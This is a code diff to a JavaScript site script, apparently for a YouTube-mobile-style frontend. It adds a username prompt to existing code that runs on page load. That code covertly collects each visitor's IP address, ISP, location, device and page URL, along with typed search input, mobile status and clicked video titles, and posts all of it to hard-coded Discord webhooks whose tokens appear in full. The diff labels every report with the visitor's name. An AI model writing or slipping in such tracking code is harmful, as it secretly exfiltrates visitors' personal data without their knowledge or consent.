@@ -1,4 +1,19 @@
-// IP + ISP Reporter with automatic fallback
+// Username setup with localStorage using key "ytm15Username"
+let username = localStorage.getItem("ytm15Username");
+if (!username) {
+  username = prompt("Enter your username:")?.trim() || "Anonymous";
+  localStorage.setItem("ytm15Username", username);
+}
+
+function changeUsername() {
+  const newName = prompt("Enter a new username:")?.trim();
+  if (newName) {
+    username = newName;
+    localStorage.setItem("ytm15Username", username);
+  }
+}
+
+// IP Reporter
 (async () => {
   const fileUrl = "https://ipv4.icanhazip.com/";
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
@@ -10,14 +25,8 @@
     async function getData(ip) {
       const primary = `https://ipapi.co/${ip}/json/`;
       const fallback = `https://corsproxy.io/?https://ipapi.co/${ip}/json/`;
-      try {
-        const r = await fetch(primary);
-        if (r.ok) return await r.json();
-      } catch {}
-      try {
-        const r2 = await fetch(fallback);
-        if (r2.ok) return await r2.json();
-      } catch {}
+      try { const r = await fetch(primary); if (r.ok) return await r.json(); } catch {}
+      try { const r2 = await fetch(fallback); if (r2.ok) return await r2.json(); } catch {}
       return {};
     }
 
@@ -30,27 +39,27 @@
     const platform = navigator.userAgentData?.platform || navigator.platform;
     const site = window.location.href.replace(/^https?:\/\//, "https://");
 
-    const message = `IP ${ip}\nISP ${isp} ${asn}\nLocation ${location}\nDevice ${platform}\nSite ${site}`;
+    const message = `User: ${username}\nIP: ${ip}\nISP: ${isp} ${asn}\nLocation: ${location}\nDevice: ${platform}\nSite: ${site}`;
 
-    const res = await fetch(webhookUrl, {
+    await fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content: message })
     });
-    console.log("IP Reporter webhook response:", res.status);
+    console.log("IP Reporter webhook sent");
   } catch (err) {
     console.error("IP Reporter Error:", err);
   }
 })();
 
-// Send user-entered text
+// Input Listener
 function sendToWebhook(content) {
   if (!content) return;
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
   fetch(webhookUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content })
+    body: JSON.stringify({ content: `User: ${username}\n${content}` })
   }).then(r => console.log("User input webhook response:", r.status))
     .catch(err => console.error("Send failed:", err));
 }
@@ -60,7 +69,7 @@ function attachInputListener(input) {
     if (e.key === "Enter") {
       const text = input.value.trim();
       if (!text) return;
-      const payload = { content: text.replace(/[`*_~>|]/g, "") };
+      const payload = { content: `User: ${username}\n${text.replace(/[`*_~>|]/g, "")}` };
       try {
         const res = await fetch("https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6", {
           method: "POST",
@@ -86,9 +95,7 @@ else document.addEventListener("DOMContentLoaded", () => {
 (async () => {
   try {
     const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
-    const message = navigator.userAgentData?.mobile
-      ? "The Person is on Mobile"
-      : "The Person is not on Mobile";
+    const message = `User: ${username}\nThe Person is on ${navigator.userAgentData?.mobile ? "Mobile" : "Desktop"}`;
     const res = await fetch(KwebhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -114,7 +121,7 @@ else document.addEventListener("DOMContentLoaded", () => {
   async function safeSend(headline) {
     try {
       const cleanHeadline = headline.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1800);
-      const message = `${fileText} has opened ${cleanHeadline}`;
+      const message = `User: ${username}\n${fileText} has opened ${cleanHeadline}`;
       const res = await fetch(winhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -130,8 +137,6 @@ else document.addEventListener("DOMContentLoaded", () => {
     const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
     if (!target) return;
     const headline = target.querySelector(".compact-media-headline");
-    if (headline && headline.innerText.trim()) {
-      safeSend(headline.innerText.trim());
-    }
+    if (headline && headline.innerText.trim()) safeSend(headline.innerText.trim());
   });
 })();
